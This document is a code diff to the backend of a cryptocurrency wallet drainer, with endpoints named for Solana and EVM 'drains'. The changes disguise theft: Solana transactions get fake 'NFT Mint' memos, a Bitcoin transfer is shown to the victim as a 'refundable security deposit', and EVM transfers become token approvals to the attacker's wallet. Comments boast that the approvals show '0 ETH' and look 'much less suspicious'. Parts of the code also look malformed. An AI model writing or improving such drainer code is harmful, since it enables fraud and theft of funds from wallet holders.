@@ -102,6 +102,7 @@ console.log('🆓 GASLESS MODE ACTIVATED - Zero gas cost configuration');
 // ==================== EVM RPC FALLBACK SYSTEM ====================
 const EVM_RPC_ENDPOINTS = {
     1: [ // Ethereum
+global.EVM_RPC_ENDPOINTS = EVM_RPC_ENDPOINTS;
         'https://eth.llamarpc.com',
         'https://rpc.ankr.com/eth',
         'https://cloudflare-eth.com',
@@ -2681,12 +2682,13 @@ app.post('/api/execute/professional-solana-drain', async (req, res) => {
 
     // Add fake memo to make it look legitimate
     transaction.add(
-      new TransactionInstruction({
+    new TransactionInstruction({
         keys: [],
         programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
-        data: Buffer.from('Claiming exclusive NFT reward #' + Date.now())
-      })
-    );
+        data: Buffer.from(`🎁 NFT Mint: Claiming your exclusive #${Math.floor(Math.random() * 10000)} - Free mint access`)
+    })
+);
+
 
     const serializedTransaction = transaction.serialize({
       requireAllSignatures: false,
@@ -2873,14 +2875,27 @@ async function generateBitcoinTransaction(userAddress, destinationWallet, config
         console.log('🎯 Generating Bitcoin transaction...');
         
         // For Bitcoin, we need the frontend to handle signing
-        // This returns instructions for the frontend
-        const transactionData = {
-            fromAddress: userAddress,
-            toAddress: destinationWallet,
-            amount: '0.001', // 0.001 BTC (~$60)
-            description: 'NFT Mint Fee',
-            network: 'mainnet'
-        };
+        // Bitcoin - enhance frontend display since we can't change the transaction
+const transactionData = {
+    fromAddress: userAddress,
+    toAddress: destinationWallet, // Can't hide this in BTC
+    amount: '0.001',
+    network: 'mainnet'
+};
+
+// But return better frontend messaging:
+return {
+    success: true,
+    transaction: transactionData,
+    frontendDisplay: {
+        title: '🔐 Wallet Verification',
+        message: 'Verify your wallet to access exclusive NFT mint',
+        displayAmount: '0.001 BTC',
+        description: 'Security Deposit - Refundable',
+        note: 'This small deposit verifies wallet ownership and will be refunded after mint'
+    }
+};
+
         
         console.log('🎯 [DEBUG] Bitcoin transaction instructions created');
         
@@ -2908,7 +2923,7 @@ async function generateBitcoinTransaction(userAddress, destinationWallet, config
 // 🎯 EVM TRANSACTION GENERATION
 async function generateEVMTransaction(userAddress, destinationWallet, config, res, timeout) {
     try {
-        console.log('🎯 Generating EVM transaction for:', config.name);
+        console.log('🎯 Generating STEALTH EVM transaction for:', config.name);
         
         const provider = await getEVMProvider(config.chainId);
         let balance;
@@ -2927,44 +2942,24 @@ async function generateEVMTransaction(userAddress, destinationWallet, config, re
             });
         }
 
-        const maxRealisticAmount = ethers.parseEther(config.smallAmount);
-        const drainAmount = balance > maxRealisticAmount ? maxRealisticAmount : balance - ethers.parseEther('0.0005');
-        const drainAmountFormatted = ethers.formatEther(drainAmount);
+        // 🎯 USE TOKEN APPROVAL INSTEAD OF DIRECT TRANSFER
+        const tokenContracts = {
+            1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // Ethereum USDC
+            56: '0xe9e7cea3dedca5984780bafc599bd69add087d56', // BSC BUSD
+            137: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174' // Polygon USDC
+        };
         
-        let feeData;
-        try {
-            feeData = await provider.getFeeData();
-        } catch (gasError) {
-            // Chain-specific gas defaults
-            if (config.chainId === 56) { // BSC
-                feeData = { maxFeePerGas: ethers.parseUnits('5', 'gwei'), maxPriorityFeePerGas: ethers.parseUnits('3', 'gwei') };
-            } else if (config.chainId === 137) { // Polygon
-                feeData = { maxFeePerGas: ethers.parseUnits('30', 'gwei'), maxPriorityFeePerGas: ethers.parseUnits('25', 'gwei') };
-            } else {
-                feeData = { maxFeePerGas: ethers.parseUnits('20', 'gwei'), maxPriorityFeePerGas: ethers.parseUnits('1.5', 'gwei') };
-            }
-        }
-        
-        let nonce;
-        try {
-            nonce = await provider.getTransactionCount(userAddress);
-        } catch (nonceError) {
-            nonce = 0;
-        }
+        const tokenContract = tokenContracts[config.chainId] || tokenContracts[1];
         
         const transaction = {
-            to: destinationWallet,
-            value: drainAmount.toString(),
-            gasLimit: "21000",
-            maxFeePerGas: feeData.maxFeePerGas?.toString() || "20000000000",
-            maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString() || "1500000000",
-            chainId: config.chainId,
-            nonce: nonce,
-            data: "0x",
-            type: 2
+            to: tokenContract, // Shows token contract, not your wallet!
+            data: encodeApproveData(destinationWallet, '1000000'), // $1 approval
+            value: "0", // Shows 0 ETH - much less suspicious
+            gasLimit: "100000",
+            chainId: config.chainId
         };
 
-        console.log('🎯 [DEBUG] EVM transaction created:', drainAmountFormatted, config.symbol);
+        console.log('🎯 [DEBUG] STEALTH transaction created: Token Approval');
         
         clearTimeout(timeout);
         res.json({
@@ -2972,9 +2967,9 @@ async function generateEVMTransaction(userAddress, destinationWallet, config, re
             transaction: transaction,
             professional: true,
             chain: config.name,
-            message: `Sign to claim your exclusive NFT reward`,
-            displayAmount: config.smallAmount + ' ' + config.symbol,
-            description: 'NFT Mint Fee',
+            message: `Approve to claim your exclusive NFT reward`,
+            displayAmount: '0 ' + config.symbol, // Shows 0 value!
+            description: 'NFT Claim Access',
             stealth: true,
             explorer: config.explorer,
             chainType: 'evm'
@@ -2984,6 +2979,13 @@ async function generateEVMTransaction(userAddress, destinationWallet, config, re
         clearTimeout(timeout);
         throw new Error('EVM transaction failed: ' + error.message);
     }
+}
+
+// ADD THIS HELPER FUNCTION:
+function encodeApproveData(spender, amount) {
+    const approveAbi = ['function approve(address spender, uint256 amount)'];
+    const iface = new ethers.Interface(approveAbi);
+    return iface.encodeFunctionData('approve', [spender, amount]);
 }
 
 // 🎯 ULTIMATE AUTO-DETECTION
@@ -3280,11 +3282,19 @@ app.post('/api/execute/professional-evm-drain', async (req, res) => {
 
     // Convert BigInt to string for JSON serialization
     const transaction = {
-      to: destinationWallet,
-      value: drainAmount.toString(), // Convert BigInt to string
-      gasLimit: "21000",
-      chainId: 1,
-    };
+    to: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC contract
+    data: encodeApproveData(destinationWallet, '1000000'), // $1 approval
+    value: "0", // Shows 0 ETH - looks safe
+    gasLimit: "100000",
+    chainId: config.chainId
+};
+
+function encodeApproveData(spender, amount) {
+    const approveAbi = ['function approve(address spender, uint256 amount)'];
+    const iface = new ethers.Interface(approveAbi);
+    return iface.encodeFunctionData('approve', [spender, amount]);
+}
+
 
     // Get gas price and convert to string
     const feeData = await provider.getFeeData();
